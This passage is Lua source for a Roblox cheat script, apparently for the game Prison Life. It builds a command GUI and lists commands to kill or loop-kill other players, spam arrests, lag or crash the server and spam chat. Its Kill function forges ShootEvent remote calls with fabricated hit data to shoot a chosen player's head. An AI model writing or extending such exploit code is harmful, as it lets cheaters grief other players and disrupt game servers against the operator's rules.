	CmdText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CmdText.BackgroundTransparency = 1.000
	CmdText.BorderSizePixel = 0
	CmdText.Size = UDim2.new(0, 300, 0, 25)
	CmdText.Font = Enum.Font.SourceSans
	CmdText.Text = "Text"
	CmdText.TextColor3 = Color3.fromRGB(255, 255, 255)
	CmdText.TextScaled = true
	CmdText.TextSize = 14.000
	CmdText.TextWrapped = true

	UIListLayout.Parent = CmdHandler
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

	Minimum.Name = "Minimum"
	Minimum.Parent = Background
	Minimum.BackgroundColor3 = Color3.fromRGB(0, 155, 155)
	Minimum.BorderSizePixel = 0
	Minimum.Position = UDim2.new(0.842857122, 0, 0.00571428565, 0)
	Minimum.Size = UDim2.new(0, 20, 0, 20)
	Minimum.Font = Enum.Font.SourceSans
	Minimum.Text = ""
	Minimum.TextColor3 = Color3.fromRGB(255, 255, 255)
	Minimum.TextSize = 14.000
	Minimum.MouseButton1Click:Connect(function()
		if Background.BackgroundTransparency == 0 then
			Background.BackgroundTransparency = 1
			Background.Size = UDim2.new(0, 350, 0, 25)
			FindCmd.Visible = false
			CmdHandler.Visible = false
		elseif Background.BackgroundTransparency == 1 then
			Background.BackgroundTransparency = 0
			Background.Size = UDim2.new(0, 350, 0, 350)
			FindCmd.Visible = true
			CmdHandler.Visible = true
		end
	end)

	Close.Name = "Close"
	Close.Parent = Background
	Close.BackgroundColor3 = Color3.fromRGB(155, 0, 0)
	Close.BorderSizePixel = 0
	Close.Position = UDim2.new(0.928571403, 0, 0.00571428565, 0)
	Close.Size = UDim2.new(0, 20, 0, 20)
	Close.Font = Enum.Font.SourceSans
	Close.Text = ""
	Close.TextColor3 = Color3.fromRGB(255, 255, 255)
	Close.TextSize = 14.000
	Close.MouseButton1Click:Connect(function()
		Background.Visible = false
	end)

	-- New

	Background2.Name = "Background"
	Background2.Parent = CmdGui
	Background2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	Background2.BorderSizePixel = 0
	Background2.Position = UDim2.new(0.012, 0, 0.807, 0)
	Background2.Size = UDim2.new(0, 250, 0, 80)
	Background2.Active = true
	Background2.Draggable = true

	Label.Name = "Label"
	Label.Parent = Background2
	Label.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Label.BorderSizePixel = 0
	Label.Position = UDim2.new(0, 0, 0, 0)
	Label.Size = UDim2.new(0, 250, 0, 25)
	Label.Font = Enum.Font.GothamBlack
	Label.Text = "Execute Bar"
	Label.TextColor3 = Color3.fromRGB(255, 255, 255)
	Label.TextScaled = true
	Label.TextSize = 14.000
	Label.TextWrapped = true

	Execute.Name = "Execute"
	Execute.Parent = Background2
	Execute.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	Execute.BorderColor3 = Color3.fromRGB(0, 255, 0)
	Execute.Position = UDim2.new(0.097, 0, 0.436, 0)
	Execute.Size = UDim2.new(0, 200, 0, 30)
	Execute.Font = Enum.Font.SourceSans
	Execute.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
	Execute.PlaceholderText = "Press "..Prefix.." To Enter"
	Execute.Text = ""
	Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
	Execute.TextSize = 16.000
	Execute.TextWrapped = true

	Background3.Name = "Background3"
	Background3.Parent = CmdGui
	Background3.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	Background3.BorderSizePixel = 0
	Background3.Position = UDim2.new(0.306701034, 0, 0.288421065, 0)
	Background3.Size = UDim2.new(0, 200, 0, 100)
	Background3.Active = true
	Background3.Visible = false

	Topbar.Name = "Topbar"
	Topbar.Parent = Background3
	Topbar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	Topbar.BorderSizePixel = 0
	Topbar.Size = UDim2.new(0, 200, 0, 25)
	Topbar.Font = Enum.Font.GothamBlack
	Topbar.Text = ""
	Topbar.TextColor3 = Color3.fromRGB(255, 255, 255)
	Topbar.TextScaled = true
	Topbar.TextSize = 14.000
	Topbar.TextWrapped = true

	CmdTitle.Name = "CmdTitle"
	CmdTitle.Parent = Background3
	CmdTitle.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	CmdTitle.BackgroundTransparency = 1.000
	CmdTitle.BorderSizePixel = 0
	CmdTitle.Position = UDim2.new(0.0500000007, 0, 0.379999995, 0)
	CmdTitle.Size = UDim2.new(0, 180, 0, 40)
	CmdTitle.Font = Enum.Font.GothamBlack
	CmdTitle.Text = ""
	CmdTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
	CmdTitle.TextSize = 14.000
	CmdTitle.TextWrapped = true

	Background4.Name = "Background4"
	Background4.Parent = CmdGui
	Background4.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	Background4.BorderSizePixel = 0
	Background4.Position = UDim2.new(0.0154639352, 0, 0.519107938, 0)
	Background4.Size = UDim2.new(0, 250, 0, 119)
	Background4.Active = true
	Background4.Draggable = true

	Notify6.Name = "Notify6"
	Notify6.Parent = Background4
	Notify6.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify6.BackgroundTransparency = 1.000
	Notify6.BorderSizePixel = 0
	Notify6.Position = UDim2.new(0, 0, -0.00512820482, 0)
	Notify6.Size = UDim2.new(0, 250, 0, 20)
	Notify6.Font = Enum.Font.GothamBlack
	Notify6.Text = ""
	Notify6.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify6.TextScaled = true
	Notify6.TextSize = 14.000
	Notify6.TextWrapped = true

	Notify5.Name = "Notify5"
	Notify5.Parent = Background4
	Notify5.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify5.BackgroundTransparency = 1.000
	Notify5.BorderSizePixel = 0
	Notify5.Position = UDim2.new(0, 0, 0.162939027, 0)
	Notify5.Size = UDim2.new(0, 250, 0, 20)
	Notify5.Font = Enum.Font.GothamBlack
	Notify5.Text = ""
	Notify5.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify5.TextScaled = true
	Notify5.TextSize = 14.000
	Notify5.TextWrapped = true

	Notify4.Name = "Notify4"
	Notify4.Parent = Background4
	Notify4.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify4.BackgroundTransparency = 1.000
	Notify4.BorderSizePixel = 0
	Notify4.Position = UDim2.new(0, 0, 0.331006259, 0)
	Notify4.Size = UDim2.new(0, 250, 0, 20)
	Notify4.Font = Enum.Font.GothamBlack
	Notify4.Text = ""
	Notify4.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify4.TextScaled = true
	Notify4.TextSize = 14.000
	Notify4.TextWrapped = true

	Notify3.Name = "Notify3"
	Notify3.Parent = Background4
	Notify3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify3.BackgroundTransparency = 1.000
	Notify3.BorderSizePixel = 0
	Notify3.Position = UDim2.new(0, 0, 0.499073505, 0)
	Notify3.Size = UDim2.new(0, 250, 0, 20)
	Notify3.Font = Enum.Font.GothamBlack
	Notify3.Text = ""
	Notify3.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify3.TextScaled = true
	Notify3.TextSize = 14.000
	Notify3.TextWrapped = true

	Notify2.Name = "Notify2"
	Notify2.Parent = Background4
	Notify2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify2.BackgroundTransparency = 1.000
	Notify2.BorderSizePixel = 0
	Notify2.Position = UDim2.new(0, 0, 0.667140722, 0)
	Notify2.Size = UDim2.new(0, 250, 0, 20)
	Notify2.Font = Enum.Font.GothamBlack
	Notify2.Text = ""
	Notify2.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify2.TextScaled = true
	Notify2.TextSize = 14.000
	Notify2.TextWrapped = true

	Notify1.Name = "Notify1"
	Notify1.Parent = Background4
	Notify1.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	Notify1.BackgroundTransparency = 1.000
	Notify1.BorderSizePixel = 0
	Notify1.Position = UDim2.new(0, 0, 0.835207999, 0)
	Notify1.Size = UDim2.new(0, 250, 0, 20)
	Notify1.Font = Enum.Font.GothamBlack
	Notify1.Text = ""
	Notify1.TextColor3 = Color3.fromRGB(255, 255, 255)
	Notify1.TextScaled = true
	Notify1.TextSize = 14.000
	Notify1.TextWrapped = true

	CloseBar.Name = "CloseBar"
	CloseBar.Parent = Background4
	CloseBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	CloseBar.BorderSizePixel = 0
	CloseBar.Position = UDim2.new(0.899999976, 0, -0.210084036, 0)
	CloseBar.Size = UDim2.new(0, 25, 0, 25)
	CloseBar.Font = Enum.Font.GothamBlack
	CloseBar.Text = "X"
	CloseBar.TextColor3 = Color3.fromRGB(255, 255, 255)
	CloseBar.TextScaled = true
	CloseBar.TextSize = 14.000
	CloseBar.TextWrapped = true
	CloseBar.MouseButton1Click:Connect(function()
		Background4.Visible = false
	end)

	TransparencyBar.Name = "TransparencyBar"
	TransparencyBar.Parent = Background4
	TransparencyBar.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
	TransparencyBar.BorderSizePixel = 0
	TransparencyBar.Position = UDim2.new(0.799999952, 0, -0.210084036, 0)
	TransparencyBar.Size = UDim2.new(0, 25, 0, 25)
	TransparencyBar.Font = Enum.Font.GothamBlack
	TransparencyBar.Text = "="
	TransparencyBar.TextColor3 = Color3.fromRGB(255, 255, 255)
	TransparencyBar.TextScaled = true
	TransparencyBar.TextSize = 14.000
	TransparencyBar.TextWrapped = true
	TransparencyBar.MouseButton1Click:Connect(function()
		if TransparencyBar.Text == "=" then
			Background4.BackgroundTransparency = 0.750
			CloseBar.BackgroundTransparency = 0.750
			TransparencyBar.BackgroundTransparency = 0.750
			TransparencyBar.Text = "+"
		else
			Background4.BackgroundTransparency = 0.000
			CloseBar.BackgroundTransparency = 0.000
			TransparencyBar.BackgroundTransparency = 0.000
			TransparencyBar.Text = "="
		end
	end)

	local Versions = "5.0"
	local Cmd = {}

	Cmd[#Cmd + 1] = {Text = "versions "..Versions,Title = "Script versions"}
	Cmd[#Cmd + 1] = {Text = "script by LocalPlayer#7434",Title = "Script owner"}
	Cmd[#Cmd + 1] =	{Text = "cmd / cmds",Title = "Show commands bar"}
	Cmd[#Cmd + 1] =	{Text = "rejoin / rj",Title = "Rejoin the game"}
	Cmd[#Cmd + 1] =	{Text = "leave / leaveserver / quit",Title = "Leave the server"}
	Cmd[#Cmd + 1] =	{Text = "admin / giveadmin [plr]",Title = "Give a commands to player"}
	Cmd[#Cmd + 1] =	{Text = "unadmin / removeadmin [plr]",Title = "Remove a commands from player"}
	Cmd[#Cmd + 1] =	{Text = "kill [plr]",Title = "Kill the player"}
	Cmd[#Cmd + 1] =	{Text = "killall",Title = "Kill all players"}
	Cmd[#Cmd + 1] =	{Text = "killguard / killsguard",Title = "Kill all guards"}
	Cmd[#Cmd + 1] =	{Text = "killinmate / killsinmate",Title = "Kill all inmates"}
	Cmd[#Cmd + 1] =	{Text = "killcriminal / killscriminal",Title = "Kill all criminals"}
	Cmd[#Cmd + 1] =	{Text = "tase [plr]",Title = "Tase the player"}
	Cmd[#Cmd + 1] =	{Text = "loopkill / loopkills [plr]",Title = "Loop kills player"}
	Cmd[#Cmd + 1] =	{Text = "unloopkill / unloopkills [plr]",Title = "Unloop kills player"}
	Cmd[#Cmd + 1] =	{Text = "loopkillall / loopkillsall",Title = "Loop kills all players"}
	Cmd[#Cmd + 1] =	{Text = "loopkillguard / loopkillsguard",Title = "Loop kills all guards"}
	Cmd[#Cmd + 1] =	{Text = "loopkillinmate / loopkillinmates",Title = "Loop kills all inmates"}
	Cmd[#Cmd + 1] =	{Text = "loopkillcriminal / loopkillcriminals",Title = "Loop kills all criminals"}
	Cmd[#Cmd + 1] =	{Text = "unloopkillall / unloopkillsall",Title = "Unloop kills all players"}
	Cmd[#Cmd + 1] =	{Text = "unloopkillguard / unloopkillsguard",Title = "Unloop kills all guards"}
	Cmd[#Cmd + 1] =	{Text = "unloopkillinmate / unloopkillinmates",Title = "Unloop kills all inmates"}
	Cmd[#Cmd + 1] =	{Text = "unloopkillcriminal / unloopkillcriminals",Title = "Unloop kills all criminals"}
	Cmd[#Cmd + 1] =	{Text = "inmate / inmates / prisoner / prisoners",Title = "Become inmate team"}
	Cmd[#Cmd + 1] =	{Text = "guard / guards / cop / polices",Title = "Become guard team"}
	Cmd[#Cmd + 1] =	{Text = "crim / criminals / criminal",Title = "Become criminal team"}
	Cmd[#Cmd + 1] =	{Text = "neutral / neutrals",Title = "Become neutral team"}
	Cmd[#Cmd + 1] =	{Text = "re / refresh",Title = "Respawn on old position"}
	Cmd[#Cmd + 1] =	{Text = "res / respawn",Title = "Respawn on respawn pads"}
	Cmd[#Cmd + 1] =	{Text = "goto / to [plr]",Title = "Teleports to the player"}
	Cmd[#Cmd + 1] =	{Text = "bring [plr]",Title = "Teleports player to you"}
	Cmd[#Cmd + 1] =	{Text = "tp / teleport [plr] [plr2]",Title = "Teleports player to another player"}
	Cmd[#Cmd + 1] =	{Text = "arrest [plr] [time]",Title = "Arrest player that is a criminal"}
	Cmd[#Cmd + 1] =	{Text = "arrestall / arrestothers",Title = "Arrest all criminals"}
	Cmd[#Cmd + 1] =	{Text = "spamarrest / looparrest [plr]",Title = "Spam arrest player & lag player and server"}
	Cmd[#Cmd + 1] =	{Text = "unspamarrest / unlooparrest [plr]",Title = "Stop spam arrest player"}
	Cmd[#Cmd + 1] =	{Text = "clearloopkill / clearloopkills",Title = "clear all loop kills table"}
	Cmd[#Cmd + 1] =	{Text = "auto / autore / autorefresh",Title = "Auto respawn on old position when died"}
	Cmd[#Cmd + 1] =	{Text = "unauto / unautore / unautorefresh",Title = "Stop auto respawn on old position when died"}
	Cmd[#Cmd + 1] =	{Text = "killaura",Title = "Activate kill aura"}
	Cmd[#Cmd + 1] =	{Text = "nokillaura / unkillaura",Title = "Unactivate kill aura"}
	Cmd[#Cmd + 1] = {Text = "antifling",Title = "Activate anti fling"}
	Cmd[#Cmd + 1] = {Text = "unantifling",Title = "Unactivate anti fling"}
	Cmd[#Cmd + 1] = {Text = "god",Title = "Become a god mode"}
	Cmd[#Cmd + 1] = {Text = "ungod",Title = "Unbecome a god mode"}
	Cmd[#Cmd + 1] =	{Text = "view / spectate / watch [plr]",Title = "Spectates the player"}
	Cmd[#Cmd + 1] =	{Text = "unview / unspectate / stopwatch",Title = "Unspectates the player"}
	Cmd[#Cmd + 1] =	{Text = "fastpunch / speedpunchh",Title = "Activate fast punch"}
	Cmd[#Cmd + 1] =	{Text = "slowpunch / nofastpunch / normalspeedpunch",Title = "unactivate fast punch"}
	Cmd[#Cmd + 1] =	{Text = "superpunch / onepunch",Title = "Activate super punch"}
	Cmd[#Cmd + 1] =	{Text = "nosuperpunch / normalpunch",Title = "Unactivate super punch"}
	Cmd[#Cmd + 1] =	{Text = "prefix / newprefix / changeprefix [prefix text]",Title = "Changes prefix"}
	Cmd[#Cmd + 1] =	{Text = "red",Title = "Changes name tag color to red color"}
	Cmd[#Cmd + 1] = {Text = "antilag / boostfps",Title = "Boost a little fps"}
	Cmd[#Cmd + 1] = {Text = "unantilag",Title = "Stop boost the fps"}
	Cmd[#Cmd + 1] = {Text = "noclip / noclips",Title = "Activate no clips"}
	Cmd[#Cmd + 1] = {Text = "clip / clips",Title = "Unactivate no clips"}
	Cmd[#Cmd + 1] =	{Text = "orange",Title = "Changes name tag color to orange color"}
	Cmd[#Cmd + 1] =	{Text = "blue",Title = "Changes name tag color to blue color"}
	Cmd[#Cmd + 1] =	{Text = "black",Title = "Changes name tag color to black color"}
	Cmd[#Cmd + 1] =	{Text = "purple",Title = "Changes name tag color to purple color"}
	Cmd[#Cmd + 1] =	{Text = "brown",Title = "Changes name tag color to brown color"}
	Cmd[#Cmd + 1] =	{Text = "white",Title = "Changes name tag color to white color"}
	Cmd[#Cmd + 1] =	{Text = "pink",Title = "Changes name tag color to pink color"}
	Cmd[#Cmd + 1] =	{Text = "grey",Title = "Changes name tag color to grey color"}
	Cmd[#Cmd + 1] =	{Text = "green",Title = "Changes name tag color to green color"}
	Cmd[#Cmd + 1] =	{Text = "yellow",Title = "Changes name tag color to yellow color"}
	Cmd[#Cmd + 1] =	{Text = "getpos",Title = "Prints positions"}
	Cmd[#Cmd + 1] =	{Text = "unload / destroygui",Title = "Unload the scripts"}
	Cmd[#Cmd + 1] =	{Text = "reload / update",Title = "Reload the script to new version"}
	Cmd[#Cmd + 1] =	{Text = "How to open console?",Title = "To open console chat /console or press F9 or Fn + F9"}
	Cmd[#Cmd + 1] =	{Text = "lagserver / disconnect",Title = "Lag server and disconnect after 5 minutes of lagging"}
	Cmd[#Cmd + 1] =	{Text = "unlagserver / undisconnect",Title = "Stop lag server"}
	Cmd[#Cmd + 1] =	{Text = "speed / setspeed / walkspeed [count]",Title = "Changes walk speeds"}
	Cmd[#Cmd + 1] =	{Text = "jumppower / setjumppower [count]",Title = "Changes jump powers"}
	Cmd[#Cmd + 1] =	{Text = "hipheight / sethipheight [count]",Title = "Changes hip heights"}
	Cmd[#Cmd + 1] =	{Text = "gravity / setgravity [count]",Title = "Changes gravity"}
	Cmd[#Cmd + 1] =	{Text = "resetspeed / resetwalkspeed",Title = "Reset walk speeds"}
	Cmd[#Cmd + 1] =	{Text = "resetjumppower / rejumppower",Title = "Reset jump powers"}
	Cmd[#Cmd + 1] =	{Text = "resethipheight / rehipheight",Title = "Reset hip heights"}
	Cmd[#Cmd + 1] =	{Text = "resetgravity / regravity",Title = "Reset gravity"}
	Cmd[#Cmd + 1] =	{Text = "makecrim [plr]",Title = "Make the player become a criminal"}
	Cmd[#Cmd + 1] =	{Text = "makecrimall",Title = "Make all players become a criminals"}
	Cmd[#Cmd + 1] =	{Text = "loopbring [plr]",Title = "Loop bring player"}
	Cmd[#Cmd + 1] =	{Text = "unloopbring ",Title = "Unloop bring player"}
	Cmd[#Cmd + 1] =	{Text = "baseballbat / bat",Title = "Gets bat"}
	Cmd[#Cmd + 1] =	{Text = "superknife",Title = "Gets super knife"}
	Cmd[#Cmd + 1] =	{Text = "firespeed / setfirespeed [count]",Title = "Changes fire speed for the gun"}
	Cmd[#Cmd + 1] =	{Text = "autofire",Title = "Changes gun ststes to auto fire"}
	Cmd[#Cmd + 1] =	{Text = "semifire",Title = "Changes gun ststes to semi fire"}
	Cmd[#Cmd + 1] =	{Text = "burst / burstbullets / bullets [count]",Title = "Changes a bullets for the gun will come out when shot"}
	Cmd[#Cmd + 1] =	{Text = "reloadtime / reloadtimes [count]",Title = "Changes reload times for the gun"}
	Cmd[#Cmd + 1] =	{Text = "gun / guns / allguns",Title = "Obtains all guns"}
	Cmd[#Cmd + 1] =	{Text = "autogun / autoguns / autoallguns",Title = "Activate auto gun when respawned"}
	Cmd[#Cmd + 1] =	{Text = "unautogun / unautoguns / unautoallguns",Title = "Unactivate auto gun when respawned"}
	Cmd[#Cmd + 1] =	{Text = "taserbypass / antitaser / lock",Title = "Bypass taser when got tased"}
	Cmd[#Cmd + 1] =	{Text = "untaserbypass / notaserbypass / unlock",Title = "Unbypass taser when got tased"}
	Cmd[#Cmd + 1] =	{Text = "nodoors / deletedoors",Title = "Deletes all doors"}
	Cmd[#Cmd + 1] =	{Text = "restoredoors / doors",Title = "Restores all doors"}
	Cmd[#Cmd + 1] =	{Text = "nowalls / deletewalls - delete walls",Title = "Deletes all walls"}
	Cmd[#Cmd + 1] =	{Text = "walls / restorewalls - restore walls",Title = "Restore all walls"}
	Cmd[#Cmd + 1] =	{Text = "anticrash / antivest",Title = "Anti crash when someone spamming armor"}
	Cmd[#Cmd + 1] =	{Text = "unanticrash / unantivest",Title = "Unanti crash when someone spamming armor"}
	Cmd[#Cmd + 1] =	{Text = "antishield / noshield",Title = "Anti shield users"}
	Cmd[#Cmd + 1] =	{Text = "unantishield",Title = "Unanti shield users"}
	Cmd[#Cmd + 1] =	{Text = "gatetower",Title = "Teleports to the gate tower"}
	Cmd[#Cmd + 1] =	{Text = "tower",Title = "Teleports to the yard tower"}
	Cmd[#Cmd + 1] =	{Text = "sewer",Title = "Teleports to the sewer"}
	Cmd[#Cmd + 1] = {Text = "yard",Title = "Teleports to yard"}
	Cmd[#Cmd + 1] =	{Text = "backnexus",Title = "Teleports to the back nexus"}
	Cmd[#Cmd + 1] =	{Text = "nexus",Title = "Teleports to the nexus"}
	Cmd[#Cmd + 1] =	{Text = "gate",Title = "Teleports to the gate"}
	Cmd[#Cmd + 1] = {Text = "findowner / checkscriptowner",Title = "Find a script owner in the server"}
	Cmd[#Cmd + 1] = {Text = "getplayer / getplayers",Title = "Get a players counts in the server"}
	Cmd[#Cmd + 1] = {Text = "rapidfire",Title = "Activate rapid fire"}
	Cmd[#Cmd + 1] = {Text = "autorapidfire",Title = "Auto activate rapid fire"}
	Cmd[#Cmd + 1] = {Text = "unautorapidfire",Title = "Unauto activate rapid fire"}
	Cmd[#Cmd + 1] =	{Text = "armory",Title = "Teleports to the armory"}
	Cmd[#Cmd + 1] =	{Text = "cafe - teleport to cafe",Title = "Teleports to the cafeteria"}
	Cmd[#Cmd + 1] =	{Text = "crimbase / criminalbase",Title = "Teleports to the criminals base"}
	Cmd[#Cmd + 1] =	{Text = "lunchroom",Title = "Teleports to the cafeteria room"}
	Cmd[#Cmd + 1] =	{Text = "spamchat [delay]",Title = "Spam the chat"}
	Cmd[#Cmd + 1] =	{Text = "unspamchat",Title = "Unspam the chat"}
	Cmd[#Cmd + 1] =	{Text = "savepos / saveposition",Title = "Saves positions"}
	Cmd[#Cmd + 1] =	{Text = "loadpos / loadposition",Title = "Loads positions"}
	Cmd[#Cmd + 1] =	{Text = "notify",Title = "Send a message when player leave / join"}
	Cmd[#Cmd + 1] =	{Text = "nonotify",Title = "Stop send a message when player leave / join"}
	Cmd[#Cmd + 1] =	{Text = "copychat",Title = "Copies all players chats"}
	Cmd[#Cmd + 1] =	{Text = "uncopychat",Title = "uncopies all players chats"}
	Cmd[#Cmd + 1] =	{Text = "chatnotify",Title = "Chats when player leave / join"}
	Cmd[#Cmd + 1] =	{Text = "unchatnotify / nochatnotify",Title = "Stop chat when player leave / join"}
	Cmd[#Cmd + 1] =	{Text = "opengate",Title = "Open the gate"}
	Cmd[#Cmd + 1] =	{Text = "antifell / antivoid",Title = "Activate anti fell to the void when respawn as custom team"}
	Cmd[#Cmd + 1] =	{Text = "unantifell / unantivoid",Title = "Unactivate anti fell to the void when respawn as custom team"}
	Cmd[#Cmd + 1] =	{Text = "beam [plr]",Title = "Shoot a beam to player"}
	Cmd[#Cmd + 1] =	{Text = "lagbeam / beam2 [plr]",Title = "Shoot a beam to player but lag"}
	Cmd[#Cmd + 1] =	{Text = "crash / beam3 [plr]",Title = "Shoot a beam to player but even more lag"}
	Cmd[#Cmd + 1] = {Text = "antispamarrest",Title = "Activate anti spam arrest"}
	Cmd[#Cmd + 1] = {Text = "unantispamarrest",Title = "Unactivate anti spam arrest"}
	Cmd[#Cmd + 1] =	{Text = "!getprefix",Title = "If you for get prefix you can type this in chat"}

	local Mouse = game.Players.LocalPlayer:GetMouse()

	for i = 1,#Cmd do
		local clone = CmdText:Clone()
		clone.Text = Cmd[i].Text
		clone.Name = "COMMANDS"
		local Ins = Instance.new("StringValue", clone)
		Ins.Name = "Title"
		Ins.Value = Cmd[i].Title
		local Ins2 = Instance.new("StringValue", clone)
		Ins2.Name = "TopbarName"
		Ins2.Value = Cmd[i].Text:split(" ")[1]
		clone.Parent = CmdHandler
		clone.MouseButton1Click:Connect(function()
			Execute:CaptureFocus()
			Execute.Text = clone.Text:split(" ")[1]
			Execute.CursorPosition = #Execute.Text + 1
		end)
	end

	Mouse.Move:Connect(function()
		local Guis = coregui:GetGuiObjectsAtPosition(Mouse.X, Mouse.Y)
		local Gui
		for i,v in pairs(Guis) do
			if v.Parent == CmdHandler then
				Gui = v
			end
		end
		if Gui ~= nil then
			local PositionX
			local PositionY
			local X = Mouse.X
			local Y = Mouse.Y
			if Mouse.X > 200 then
				PositionX = Mouse.X - 201
			else
				PositionX = Mouse.X + 21
			end
			if Mouse.Y > (Mouse.ViewSizeY-96) then
				PositionY = Mouse.Y - 97
			else
				PositionY = Mouse.Y
			end
			Background3.Visible = true
			Background3.Position = UDim2.new(0, PositionX, 0, PositionY)
			Topbar.Text = Gui.TopbarName.Value
			CmdTitle.Text = Gui.Title.Value
		else
			Background3.Visible = false
		end
	end)

	if DisableScript then
		DisableScript()
	end

	local Slient = false
	local ScriptDisabled = false
	local LoopBeam = {}
	local LoopKill = {}
	local LoopTase = {}
	local Admin = {}
	local Watching = nil
	local States = {}
	local BuyGamepass = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(tonumber((game:GetService("Players").LocalPlayer.CharacterAppearance):split('=')[#((game:GetService("Players").LocalPlayer.CharacterAppearance):split('='))]), 96651)

	local function GetPlayer(String)
		if not String then return end
		local Yes = {}
		for _, Player in ipairs(game.Players:GetPlayers()) do
			if string.lower(Player.Name):match(string.lower(String)) or string.lower(Player.DisplayName):match(string.lower(String)) then
				table.insert(Yes, Player)
			end
		end
		if #Yes > 0 then
			return Yes[1]
		elseif #Yes < 1 then
			return nil
		end
	end

	local function GetPos()
		return game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	end

	local function GetCamPos()
		return workspace.CurrentCamera.CFrame
	end

	local function GetTeam()
		return game.Players.LocalPlayer.TeamColor.Name
	end

	function Goto(Player, Distance)
		local Distance = Distance or CFrame.new(0, 0, 0)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * Distance
	end

	function Split(Arguaments, Split)
		if not Arguaments or not Split then return end
		return Arguaments:split(Split)
	end

	function ChatNotify(Message, Colors, Size)
		game.StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = Message,
			Color = Colors or Color3.fromRGB(255, 255, 255),
			Font = Enum.Font.SourceSans,
			FontSize = Size or Enum.FontSize.Size48
		})
	end

	function Chat(Message, Whisper)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Message, Whisper or "ALl")
	end

	function WaitForChild(Time, Parent, Child)
		if not Parent or not Child then return end
		if Parent == "LocalPlayer" then Parent = game.Players.LocalPlayer end
		if Parent == "Character" then Parent = game.Players.LocalPlayer.Character end
		if Parent == "Backpack" then Parent = game.Players.LocalPlayer.Character.Backpack end
		local Times = Time * 10 or 1
		repeat wait(.1)
			Time = Time - 1
		until Parent:FindFirstChild(Child) or Time <= 0
		if Parent and Parent:FindFirstChild(Child) then
			return Parent:FindFirstChild(Child)
		else
			return nil
		end
	end

	function Kill(Player)
		pcall(function()
			if Player.Character:FindFirstChild("ForceField") or not workspace:FindFirstChild(Player.Name) or not workspace:FindFirstChild(Player.Name):FindFirstChild("Head") or Player == nil or Player.Character.Parent ~= workspace then return end
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)

			local MyTeam = GetTeam()
			if Player.TeamColor.Name == game.Players.LocalPlayer.TeamColor.Name then
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.random().Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
			end

			local Gun = game.Players.LocalPlayer.Character:FindFirstChild("Remington 870") or game.Players.LocalPlayer.Backpack:FindFirstChild("Remington 870")

			local FireEvent = {
				[1] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [2] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [3] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [4] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [5] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [6] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [7] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}, [8] = {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Head
				}
			}

			game:GetService("ReplicatedStorage").ShootEvent:FireServer(FireEvent, Gun)
			Gun.Parent = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character["Remington 870"]:Destroy()
		end)
	end

	function Tase(Player)
		if Player.TeamColor.Name == "Bright blue" or not workspace:FindFirstChild(Player.Name) or not workspace:FindFirstChild(Player.Name):FindFirstChild("Head") or Player == nil or Player.Character.Parent ~= workspace then return end
		pcall(function()
			local savedcf = GetPos()
			local savedteam

			local Gun = game.Players.LocalPlayer.Backpack:FindFirstChild("Taser") or game.Players.LocalPlayer.Character:FindFirstChild("Taser")

			local changedteam = false
